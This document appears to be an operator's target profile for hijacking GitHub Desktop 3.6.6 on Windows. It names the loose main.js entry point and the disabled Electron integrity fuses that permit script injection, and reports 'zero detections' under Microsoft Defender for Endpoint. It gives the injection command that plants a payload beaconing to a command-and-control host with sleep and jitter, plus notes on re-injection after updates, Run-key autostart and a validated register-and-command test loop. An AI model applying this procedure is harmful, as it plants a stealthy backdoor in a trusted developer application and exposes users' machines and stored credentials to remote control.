# Target profile: GitHub Desktop

**Verified:** 2026-09-23 · GitHub Desktop 3.6.6 (Squirrel) · DT-MDE-TEST
(MDE fully on) · **zero detections**

## Layout

Classic Squirrel: `%LOCALAPPDATA%\GitHubDesktop\` with `Update.exe`,
versioned `app-3.6.6\` dir. Real exe: `app-3.6.6\GitHubDesktop.exe`
(the root exe is the Squirrel stub). **No asar** — loose
`app-3.6.6\resources\app\` with `main.js` (242 KB webpack CJS bundle),
`package.json` (`main: ./main.js`, no `type` → CommonJS), native `.node`
modules loose beside it (keytar, registry, fs_admin, ...).

## Fuses: `101100011`

Same as VS Code: **embeddedAsarIntegrity=0**, **onlyLoadAppFromAsar=0** →
loose-file script-jack permitted.

## Hook

- Entry: `app-3.6.6\resources\app\main.js` (CJS — the `import()` hook form
  works there too).
- Command:
  `inject_unpacked.js --app app-3.6.6\resources --payload <bundle> --name support --target app/main.js --host <H> --port <P> --sleep <S> --jitter <J>`
- Payload at `app-3.6.6\resources\support.js`; delete the sidecar
  (`support.json`) when using an encrypted bake.

## Durability

Squirrel updates replace the whole `app-*` dir → hook dies on update.
Re-inject per `docs/runbook.md` (ticket 007). Squirrel's own `Update.exe`
Run key exists if autostart riding is ever wanted (ticket 006, descoped).

## Validated battery

inject → launch → register → `ls` round-trip → kill + relaunch →
re-registers → `--clean` → zero residue, app boots clean, no registration.
